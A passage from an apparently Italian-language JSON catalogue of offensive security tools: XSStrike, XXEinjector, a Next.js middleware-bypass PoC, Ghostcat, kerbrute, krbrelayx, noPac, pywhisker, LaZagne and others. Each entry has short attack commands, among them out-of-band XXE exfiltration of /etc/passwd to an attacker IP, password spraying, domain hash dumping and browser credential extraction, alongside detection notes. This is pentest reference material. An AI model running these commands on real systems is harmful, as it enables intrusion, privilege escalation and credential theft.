    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XSStrike è un salto evolutivo rispetto agli scanner XSS basati su semplici pattern match. Include un motore di analisi del contesto che esamina come l'input viene riflesso nella pagina (dentro un tag, in un attributo, in uno script JS) e genera payload specifici per rompere quel contesto. Include anche un crawler, un fuzzer di parametri e capacità di bypass WAF.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Context Analysis:</strong> Capisce se l'input finisce in <code><input value=\"...\"></code> o <code>var x = '...'</code> e costruisce l'escape corretto.</p><p><strong>Intelligent Fuzzing:</strong> Invece di provare migliaia di payload a caso, ne prova pochi ma mirati e analizza la risposta per vedere se i caratteri pericolosi vengono sanitizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Interfaccia CLI Python.</p><pre><code># Scansione URL singolo\npython3 xsstrike.py -u \"https://target.com/search?q=test\"\n\n# Crawling e scan intero sito\npython3 xsstrike.py -u \"https://target.com\" --crawl</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Bug Bounty & Web Pentest:</strong> Quando scanner generici falliscono, XSStrike trova XSS complessi (es. DOM-based o in contesti JS difficili) riducendo i falsi positivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico malevolo (tag script, eventi on*) che i WAF bloccano. Supporta delay e proxy per mitigare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "xxeinjector",
    "name": "XXEinjector",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/enjoiz/XXEinjector",
    "desc": "Tool automatico per sfruttare vulnerabilità XXE (XML External Entity): estrazione file (OOB), enumerazione porte e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XXEinjector è un framework Ruby per automatizzare attacchi XXE complessi. Gestisce la creazione di server locali (HTTP/FTP) per ricevere dati esfiltrati via Out-Of-Band (OOB) channels, essenziale quando l'XXE è \"blind\" (non mostra output nella risposta). Supporta protocolli multipli (SOAP, XML-RPC, REST).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>OOB Exfiltration:</strong> Avvia server per catturare file inviati dal target via DTD injection.</p><p><strong>Port Scanning:</strong> Può usare l'XXE per scansionare la rete interna del server (SSRF via XXE).</p><p><strong>PHP Expect:</strong> Tenta RCE se il wrapper <code>expect://</code> è abilitato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede di salvare la richiesta HTTP vulnerabile in un file.</p><pre><code># Attacco Blind OOB per leggere /etc/passwd\nruby XXEinjector.rb --host=attacker_ip --path=/etc/passwd --file=req.txt --proxy=127.0.0.1:8080 --oob=http</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Exploitation di endpoint XML (es. SAML, SOAP) vulnerabili. L'OOB è spesso l'unico modo per dimostrare l'impatto critico di una Blind XXE.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il server target effettuerà connessioni in uscita verso l'IP dell'attaccante (OOB). Questo traffico è spesso bloccato o loggato dai firewall egress.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XXE"
    ],
    "notes": null
  },
  {
    "id": "poc-cve-2025-29927",
    "name": "PoC CVE-2025-29927",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Exploit per bypass autorizzazione middleware in Next.js tramite manipolazione header (x-middleware-subrequest).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo Proof of Concept dimostra una vulnerabilità critica in Next.js (CVE-2025-29927) che permette di aggirare i controlli di sicurezza implementati nel middleware. Inserendo uno specifico header interno (<code>x-middleware-subrequest</code>) nella richiesta HTTP, un attaccante può ingannare l'applicazione facendole credere che la richiesta provenga da un componente interno fidato, saltando così le verifiche di autenticazione o autorizzazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Middleware Bypass:</strong> Neutralizza le regole di sicurezza definite nel middleware (es. redirect al login, check permessi) per accedere direttamente a route protette.</p><p><strong>Header Injection:</strong> Costruisce richieste con l'header <code>x-middleware-subrequest</code> valorizzato in modo da matchare il nome del middleware interno, forzando il bypass.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Utilizzare curl o lo script Python per inviare la richiesta manipolata.</p><pre><code># Accesso a /admin bypassando auth\ncurl -H \"x-middleware-subrequest: middleware\" http://target.com/admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Modern Web App Assessment:</strong> Cruciale per testare applicazioni React/Next.js recenti. Se il middleware gestisce l'authz, questo exploit garantisce accesso amministrativo o ai dati utente senza credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La presenza dell'header <code>x-middleware-subrequest</code> in richieste esterne è un indicatore di attacco certo. Facile da filtrare a livello di reverse proxy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Next_js"
    ],
    "notes": null
  },
  {
    "id": "cnvd-2020-10487-tomcat-ajp-lfi",
    "name": "CNVD-2020-10487-Tomcat-Ajp-lfi",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",
    "desc": "Exploit PoC per vulnerabilità \"Ghostcat\" in Apache Tomcat (AJP connector) che permette lettura file e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script sfrutta la vulnerabilità Ghostcat (CVE-2020-1938 / CNVD-2020-10487) presente nel protocollo AJP di Apache Tomcat. Il connettore AJP (porta 8009) è spesso abilitato di default e si fida di tutti i pacchetti in arrivo. L'exploit permette a un attaccante non autenticato di leggere file di configurazione o codice sorgente dalla webapp (Local File Inclusion) o, se è possibile l'upload di file, di ottenere Remote Code Execution.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LFI via AJP:</strong> Invia pacchetti AJP malformati per forzare il server a processare file arbitrari (come <code>WEB-INF/web.xml</code>) come se fossero pagine JSP, rivelando password o configurazioni sensibili.</p><p><strong>RCE Potential:</strong> Se l'attaccante può caricare un file (anche un'immagine) sul server, questo exploit può forzare Tomcat a includerlo ed eseguirlo come codice malevolo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e l'IP del target (porta 8009).</p><pre><code># Lettura del file web.xml (default)\npython2 exploit.py 192.168.1.10\n\n# Lettura di un file specifico\npython2 exploit.py 192.168.1.10 -f WEB-INF/classes/application.properties</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Molto comune in <strong>Internal Pentest</strong>, dove la porta 8009 non è filtrata dai firewall interni. Spesso permette di ottenere credenziali database dai file di configurazione estratti, portando alla compromissione totale dell'applicazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Traffico sulla porta 8009 è sospetto se non proviene da un reverse proxy noto. IDS rilevano le firme Ghostcat standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Tomcat"
    ],
    "notes": null
  },
  {
    "id": "kerbrute-linux-amd64",
    "name": "kerbrute_linux_amd64",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool Go per enumerazione utenti e password spraying veloce tramite Kerberos Pre-Auth, evitando blocchi account.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute è lo strumento standard per enumerare validi account Active Directory e testare password in modo furtivo. Sfrutta il fatto che il KDC (Key Distribution Center) risponde diversamente alle richieste di pre-autenticazione per utenti inesistenti rispetto a quelli esistenti, permettendo di validare liste di username enormi molto velocemente senza generare log di \"Logon Failure\" (Event 4625) classici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enum Stealth:</strong> Valida l'esistenza degli utenti analizzando gli errori Kerberos, invisibile a policy di lockout standard.</p><p><strong>Password Spraying:</strong> Esegue tentativi di accesso distribuiti (una password per tutti gli utenti) verificando le credenziali direttamente contro il DC via porta 88.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Non richiede dominio joinato, solo visibilità di rete.</p><pre><code># Enumerazione utenti validi\n./kerbrute userenum -d lab.local --dc 192.168.1.5 users.txt\n\n# Password Spraying\n./kerbrute passwordspray -d lab.local users.txt \"Summer2024!\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Recon:</strong> Il primo passo in un internal pentest black-box per pulire la lista di potenziali username prima di attaccarli, o per ottenere il primo accesso valido tramite spraying.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera Event ID 4771 (Kerberos Pre-Auth Failed). Defender for Identity rileva facilmente volumi alti di queste richieste.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "krbrelayx",
    "name": "krbrelayx",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dirkjanm/krbrelayx",
    "desc": "Toolkit per attacchi di coercizione e relay Kerberos (LDAP/SMB) per scalare privilegi su Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>KrbRelayX è una suite di strumenti progettata per sfruttare vulnerabilità logiche nel protocollo Kerberos e nelle configurazioni di delega. Permette di intercettare autenticazioni Kerberos forzate (tramite tecniche di coercizione come PrinterBug o PetitPotam) e inoltrarle (Relay) verso altri servizi, tipicamente LDAP, per creare nuovi account macchina o modificare attributi sensibili (RBCD).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Kerberos Relaying:</strong> A differenza del relay NTLM, il relay Kerberos è possibile in specifici scenari (es. uPnP non patchato o cross-protocol). Permette di ottenere privilegi SYSTEM su computer target o modificare owner di oggetti AD.</p><p><strong>DCSync via Relay:</strong> Se si riesce a rilanciare l'autenticazione di un DC verso LDAP, è possibile eseguire abuse di ACL per preparare un attacco DCSync.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede coordinazione tra listener e trigger di coercizione.</p><pre><code># Avvio listener relay verso LDAP per creare computer account\npython3 krbrelayx.py -t ldaps://dc01.local\n\n# Innesco coercizione (da altro terminale/tool)\npython3 printerbug.py domain/user:pass@target_ip listener_ip</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Privilege Escalation avanzata:</strong> Usato quando NTLM relay è mitigato (SMB Signing). Permette di passare da accesso di rete a Domain Admin sfruttando un server non patchato che accetta connessioni in entrata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di account macchina anomali o modifiche RBAC sono loggate. Le tecniche di coercizione (RPC pipes) sono monitorate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "nopac",
    "name": "noPac",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ridter/noPac",
    "desc": "Exploit tool per CVE-2021-42278 e CVE-2021-42287 (sAMAccountName spoofing) che permette Privilege Escalation a Domain Admin.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>NoPac (o sam-the-admin) sfrutta due vulnerabilità nella gestione Kerberos degli account macchina. Rinominando un account macchina (che l'utente può creare/gestire) per matchare il nome di un Domain Controller, richiedendo un TGT, e poi rinominandolo indietro, è possibile ottenere un Service Ticket valido per il DC come se fossimo amministratori. Il risultato è l'accesso come Domain Admin istantaneo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Privilege Escalation:</strong> Da utente standard (con quota machine account > 0) a Domain Admin in pochi secondi.</p><p><strong>DCSync:</strong> Spesso integra la funzionalità di dump degli hash (DCSync) subito dopo l'exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python (Impacket based).</p><pre><code># Exploit chain per ottenere shell come SYSTEM sul DC\npython3 noPac.py domain.local/user:pass -dc-ip 192.168.1.5 -shell\n\n# Solo dump hash\npython3 noPac.py domain.local/user:pass -dc-ip 192.168.1.5 -dump</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Pentest:</strong> Se il dominio non è patchato (patch fine 2021), questo è il metodo più veloce per compromettere l'intero dominio partendo da un utente low-privilege.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il rinominare account macchina (sAMAccountName change) più volte in pochi secondi è un IoC molto forte rilevato da MDI.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "pkinittools",
    "name": "PKINITtools",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dirkjanm/PKINITtools",
    "desc": "Toolkit Python per manipolare l'autenticazione Kerberos PKINIT (Certificate-based) e ottenere TGT/NTLM hash.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PKInitTools è una suite (che include <code>gettgtpkinit.py</code>) per interagire con la pre-autenticazione Kerberos basata su certificati (PKINIT). È fondamentale per sfruttare vulnerabilità in Active Directory Certificate Services (ADCS). Permette di richiedere un Ticket Granting Ticket (TGT) usando un certificato PFX (rubato o generato maliziosamente) e, successivamente, recuperare l'hash NTLM dell'account associato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auth via Certificato:</strong> Autenticarsi al dominio senza password, usando solo un certificato valido e la sua chiave privata.</p><p><strong>Unpac the Hash:</strong> Una volta ottenuto il TGT via PKINIT, permette di recuperare la chiave di sessione e l'hash NTLM dell'utente, tecnica nota come \"Unpacking\".</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Tipico workflow ADCS exploitation.</p><pre><code># Richiesta TGT con certificato PFX\npython3 gettgtpkinit.py -cert-pfx user.pfx -pfx-pass password domain/user ccache_file\n\n# Recupero hash NTLM dal TGT (se si possiede la chiave)\npython3 getnthash.py -key <AS-REP-KEY> domain/user</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>ADCS Exploitation:</strong> Se si sfrutta una vulnerabilità come ESC1 o ESC8 per ottenere un certificato amministrativo, questo tool è il ponte per trasformare quel certificato in un accesso Kerberos utilizzabile o in un hash per il cracking/pass-the-hash.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di PKINIT genera eventi specifici (4768 con PreAuthType 16 o 15). Se l'utente non usa smartcard abitualmente, è molto sospetto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "pywhisker",
    "name": "pywhisker",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ShutdownRepo/pywhisker",
    "desc": "Tool Python per sfruttare vulnerabilità \"Shadow Credentials\" (Key Trust Account) in AD e prendere controllo di account utente/computer.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PyWhisker sfrutta l'attributo <code>msDS-KeyCredentialLink</code> introdotto per Windows Hello for Business. Se un attaccante ha diritti di scrittura su questo attributo di un oggetto AD (es. tramite deleghe generiche), può iniettare una propria chiave pubblica (\"Shadow Credential\"). Questo permette di autenticarsi come quell'utente/computer usando PKINIT e ottenere un TGT, bypassando completamente la password dell'account.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Key Injection:</strong> Genera un certificato self-signed e aggiunge la chiave pubblica all'attributo target.</p><p><strong>TGT Acquisition:</strong> Usa la chiave privata associata per richiedere un TGT al KDC.</p><p><strong>Persistence:</strong> Tecnica eccellente per backdooring stealth, poiché non cambia la password dell'utente e l'attributo è raramente monitorato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script (parte di ThePorgs suite).</p><pre><code># Iniezione Shadow Credential su target\npython3 pywhisker.py -d domain.local -u atacante -p pass -t target_user --action \"add\"\n\n# Autenticazione con certificato generato\npython3 gettgtpkinit.py ... (usando il pfx generato da pywhisker)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Privilege Escalation & Persistence:</strong> Se si scopre di avere diritti <code>GenericWrite</code> o <code>WriteProperty</code> su un Domain Admin o un DC, PyWhisker trasforma quel permesso in compromissione totale in modo silenzioso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Modifiche a <code>msDS-KeyCredentialLink</code> generano eventi di Directory Service Change (5136), ma sono spesso ignorati. Defender for Identity inizia a rilevare queste anomalie.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kerberos-windows-scripts",
    "name": "kerberos_windows_scripts",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerberos_windows_scripts",
    "desc": "Collezione di script Bash per interagire con Kerberos (kinit, klist, rpc) da Linux senza dipendenze pesanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo repository (spesso associato a ropnop o risorse simili) fornisce un set di script Bash leggeri per gestire l'autenticazione Kerberos direttamente da un terminale Linux (es. Kali o una macchina compromessa). Permette di richiedere ticket (TGT/TGS), listare la cache e interagire con servizi RPC senza dover installare suite pesanti come Impacket, sfruttando i binari nativi <code>krb5-user</code>.</p><br><hr><h4 class=\"rt-purple\">Script principali</h4><p><strong>kinit wrappers:</strong> Script per automatizzare la richiesta di TGT con password o keytab, gestendo automaticamente la configurazione del realm in <code>krb5.conf</code> se necessario.</p><p><strong>Ticket Management:</strong> Utility per visualizzare (<code>klist</code> wrapper), rinnovare o distruggere ticket nella cache, essenziale per passare da un'identità compromessa all'altra.</p><p><strong>RPC Interaction:</strong> Helper per usare <code>rpcclient</code> con autenticazione Kerberos (flag <code>-k</code>) sfruttando il ticket in cache per enumerazione SMB/RPC stealth.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire gli script dalla shell dopo aver installato i client krb5.</p><pre><code># Autenticazione e ottenimento TGT\n./init_krb.sh user@DOMAIN.LOCAL Password123\n\n# Enumerazione RPC usando il ticket\nrpcclient -k dc01.domain.local -c \"enumdomusers\"</code></pre><p>La variabile d'ambiente <code>KRB5CCNAME</code> viene spesso gestita per puntare al ticket corretto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Perfetto per scenari <strong>Living off the Land</strong> su server Linux compromessi che sono già joinati al dominio (es. server web SSSD). Permette di usare l'identità della macchina o di un utente compromesso per muoversi lateralmente senza caricare tool esterni sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede che il pacchetto <code>krb5-user</code> sia installato. Il traffico Kerberos verso il DC è legittimo, ma l'uso anomalo (es. troppi TGT request) può essere loggato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "kerbrute",
    "name": "kerbrute",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool per enumerazione utenti e password spraying via Kerberos Pre-Auth, stealth rispetto ai log di login classici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute sfrutta il protocollo Kerberos (porta 88 UDP/TCP) per validare username e testare password. Poiché la pre-autenticazione Kerberos avviene prima del login SMB/RPC, questo metodo è molto più veloce e genera meno eventi di sicurezza critici (4625) rispetto ai metodi tradizionali. È lo strumento d'elezione per attacchi di password spraying in ambienti AD.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Distingue tra utenti validi e non validi basandosi sui codici di errore Kerberos, permettendo di pulire liste di username sporche.</p><p><strong>Lockout Safe Spray:</strong> In modalità spray (una password, molti utenti), il rischio di bloccare account è minimo se usato correttamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Binario Go standalone (Linux/Windows/Mac).</p><pre><code># Enumerazione utenti da lista\n./kerbrute userenum --dc 10.0.0.1 -d domain.local users.txt\n\n# Password Spraying\n./kerbrute passwordspray -d domain.local users.txt \"Welcome123\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Network Pentest:</strong> Per ottenere il primo accesso valido (Initial Access) testando password comuni (StagioneAnno!) contro tutti gli utenti del dominio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Monitorato da Defender for Identity (MDI) che rileva picchi di traffico AS-REQ. Usare con cautela.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "dehashed",
    "name": "Dehashed",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Motore di ricerca e intelligence per credenziali compromesse e asset nel deep web, interrogabile via web o API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DeHashed è una piattaforma di data mining e intelligence che indicizza miliardi di asset compromessi provenienti da breach pubblici e privati. A differenza di semplici checker, permette ricerche avanzate (wildcard, regex) su email, username, password, hash, indirizzi IP e nomi fisici. È uno strumento fondamentale per la fase di ricognizione passiva (OSINT) e per arricchire i dati durante un engagement, permettendo di trasformare un singolo indicatore (es. un'email) in un profilo completo di credenziali potenzialmente valide.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Advanced Search Query:</strong> Supporta operatori complessi per filtrare i risultati. È possibile cercare tutte le password associate a un dominio specifico (<code>domain:target.com</code>) o trovare utenti che hanno utilizzato una password specifica (<code>password:\"Company2023!\"</code>), utile per identificare pattern di riutilizzo.</p><p><strong>Breach Monitoring:</strong> Permette di monitorare asset aziendali in tempo reale, ricevendo alert quando nuove credenziali relative al proprio dominio appaiono in dump o leak nel dark web.</p><p><strong>Hash Cracking (Lookup):</strong> Il database contiene spesso sia l'hash che la password in chiaro decifrata da leak precedenti, risparmiando tempo di cracking costoso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accessibile via interfaccia web o API (per integrazione con tool come <code>DeHashed-API-Wrapper</code> o <code>Maltego</code>).</p><pre><code># Esempio query web per trovare credenziali admin\nemail:admin@target.com AND password:*\n\n# Ricerca inversa da un hash NTLM trovato\nhash:8846F7EAEE8FB117AD06BDD830B7586C\n\n# Ricerca ampia su dominio escludendo sottodomini noise\ndomain:target.com AND NOT email:support@*</code></pre><p>I risultati possono essere esportati in JSON/CSV per analisi offline.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>OSINT & Recon</strong>, fornisce la \"benzina\" per attacchi di Credential Stuffing o Password Spraying senza inviare un singolo pacchetto verso il bersaglio. In <strong>Incident Response</strong>, aiuta a verificare se le credenziali di un utente compromesso erano già presenti in breach storici (es. Collection #1) o se sono frutto di un attacco recente (es. InfoStealer malware).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'attività è totalmente <strong>passiva</strong>. Nessuna interazione avviene con i sistemi del target, rendendo questa fase invisibile ai difensori aziendali.</p><p><strong>Impatto operativo:</strong> Nessuno sui sistemi target. Tuttavia, maneggiare database di credenziali reali richiede rispetto delle normative privacy e policy di engagement etico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "dehashed-py",
    "name": "dehashed.py",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Python wrapper per interrogare le API di DeHashed.com da riga di comando, per credential harvesting automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script funge da interfaccia CLI per il motore di ricerca DeHashed. Invece di usare l'interfaccia web, permette di eseguire query massive direttamente dal terminale, scaricando dump di credenziali compromesse (email, username, password, hash) in formato JSON o testo. È progettato per essere integrato in pipeline di ricognizione automatica o script di OSINT.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bulk Query:</strong> Accetta liste di domini o email e interroga le API sequenzialmente, gestendo la paginazione dei risultati.</p><p><strong>Output Parsing:</strong> Filtra automaticamente i risultati \"spazzatura\" e formatta l'output per essere passato direttamente a tool di password cracking (es. estraendo solo gli hash) o spraying.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede una API Key valida configurata.</p><pre><code># Ricerca credenziali per un dominio\npython3 dehashed.py -d target.com -o results.json\n\n# Ricerca inversa da hash\npython3 dehashed.py -q \"hash:5f4dcc3b5aa765d61d8327deb882cf99\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>OSINT Automatica:</strong> Inserito in uno script bash che gira ogni notte, può monitorare nuovi leak relativi ai domini dei clienti e allertare il team di sicurezza proattivamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Passivo (traffico verso DeHashed, non verso il target). Gestire con cura i file di output contenenti PII e password reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "firefox-decrypt-main",
    "name": "firefox_decrypt-main",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/unode/firefox_decrypt",
    "desc": "Script Python per estrarre e decifrare password salvate nei profili Mozilla (Firefox, Thunderbird) anche con Master Password.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Firefox Decrypt è uno strumento forense in grado di leggere i database dei profili Mozilla (file <code>logins.json</code> e <code>key4.db</code>) per estrarre le credenziali salvate. Funziona su profili Firefox, Thunderbird e derivati. Se è impostata una Master Password, lo script chiede l'input utente per derivare la chiave di decifratura, rendendolo efficace anche contro profili protetti se si conosce la password principale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-Platform:</strong> Funziona su profili copiati da Windows, Linux o Mac, poiché il formato database Mozilla è standard.</p><p><strong>Thunderbird Support:</strong> Oltre ai siti web, recupera password IMAP/SMTP/POP3 dai client di posta, spesso critiche per il movimento laterale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Puntare lo script alla cartella del profilo.</p><pre><code># Scansione automatica path default\npython3 firefox_decrypt.py\n\n# Decifratura profilo esportato\npython3 firefox_decrypt.py /tmp/profilo_vittima/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Workstation:</strong> Dopo aver compromesso un PC, esfiltrare la cartella del profilo Firefox e decifrarla offline permette di ottenere accessi a portali web interni, VPN SSL e webmail.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Accesso ai file del profilo mentre il browser è aperto può fallire. Operazione locale di lettura file.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "lazagne-2-4-7",
    "name": "LaZagne",
    "version": "2.4.7",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/AlessandroZ/LaZagne",
    "desc": "Tool forense/offensivo all-in-one per recuperare password salvate localmente da browser, chat, database, wifi e sysadmin tool.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LaZagne è un'applicazione post-exploitation open source utilizzata per recuperare le molteplici password che gli utenti salvano quotidianamente sul proprio computer. Supporta Windows, Linux e macOS. Il tool scansiona il file system e il registro alla ricerca di credenziali memorizzate da browser, client di posta, database manager, strumenti di amministrazione (es. Putty, WinSCP) e configurazioni WiFi, decifrandole quando possibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Supporto Multi-Software:</strong> Include decine di moduli specifici per estrarre password da Chrome, Firefox, Outlook, Thunderbird, FileZilla, PuTTY, OpenSSH, VNC, Network Manager e molti altri.</p><p><strong>Decifratura Locale:</strong> Utilizza le API di sistema (come DPAPI su Windows o GNOME Keyring su Linux) o algoritmi noti per decifrare le password offuscate trovate nei file di configurazione.</p><p><strong>Esecuzione in Memoria:</strong> Su Windows, può essere caricato riflessivamente o eseguito come standalone senza dipendenze Python esterne (usando la versione compilata PyInstaller), facilitando l'uso su macchine compromesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare l'eseguibile da riga di comando. Senza argomenti tenta tutti i moduli.</p><pre><code># Esecuzione completa (Tutti i moduli)\nlazagne.exe all\n\n# Solo browser e output su file\nlazagne.exe browsers -oN -o output.txt\n\n# Specifico per WiFi (richiede Admin)\nlazagne.exe 